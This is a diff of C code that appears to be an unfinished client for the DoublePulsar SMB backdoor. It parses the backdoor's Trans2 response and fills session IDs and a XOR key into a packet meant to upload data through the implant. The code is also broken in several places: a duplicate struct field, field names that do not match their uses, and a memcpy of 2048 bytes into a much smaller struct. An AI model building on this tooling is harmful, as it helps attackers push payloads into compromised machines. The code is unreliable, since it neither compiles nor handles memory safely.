@@ -38,7 +38,7 @@ typedef struct {
    uint16_t DataCountTotal;
 
    uint8_t reserved;
-	 uint16_t flags;
+   uint16_t flags;
    uint32_t timeout;   // 0x25 0x89 0x1a 0x00
    uint16_t reserved2;
 
@@ -65,8 +65,40 @@ typedef struct {
 
 char data[4096];
 
+
+/*testing this out*/
+typedef struct {
+  uint16_t SmbMessageType; //0x00
+	uint16_t SmbMessageLength; 
+	uint8_t ProtocolHeader[4]; //"\xffSMB"
+	uint8_t SmbCommand; 
+	uint32_t NtStatus; //0x00000000
+	uint8_t flags; //0x18 - pathnames not case sensitive & pathnames canonicalized
+	uint16_t flags2;  //0xC007
+	uint16_t ProcessIDHigh; //0x00
+	uint8_t signature[8]; //0x00000000000
+	uint16_t reserved; //0x0000
+	uint16_t TreeId;                     //tree ID must be set
+	uint16_t ProccessID; //0xfeff
+	uint16_t UserID; 
+	uint16_t multipleID;                 //must have a multiplex ID
+	
+	uint8_t SmbCommand;
+	uint8_t wordCount;
+	uint16_t ByteCount;
+} TRANS2_RESPONSE_HEADER;
+
 int sendStuff()
 {
+	TRANS2_RESPONSE_HEADER response;
+	unsigned char recvbuff[2048];
+	//get SMB Trans2 Response from DoublePulsar
+	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
+	
+	//copy the Trans2 Response to structure we can extract information we need
+	//such as: TreeID, Multiplex, UserID, ProcessID
+	memcpy(&response, recvbuff, sizeof(recvbuff));
+	
 	unsigned int XorKey; //unsigned integer calculated XOR key from backdoor.  extracted & calculated from SMG signature.
       	XorKey = 0x58581162; //for testing's sake, we have used a static one for the purposes of this to compile correctly
 
@@ -86,9 +118,10 @@ int sendStuff()
       	uploadpacket.Flags = 0x18;
       	uploadpacket.Flags2 = 0xC007;
       
-      	uploadpacket.ProcessID = 0xfeff;
+	uploadpacket.UserID = response.UserID; 
+      	uploadpacket.ProcessID = response.ProcessID; //Default value:  0xfeff;
       	uploadpacket.signature = 0x00000000;
-      	uploadpacket.TreeID = 2018; //grab from SMB response
+      	uploadpacket.TreeID = response.TreeID; //grab from SMB response
       	uploadpacket.MultiplexID = 41; //find out the true value, should it be 41?
 
       	//trans2 packet stuff
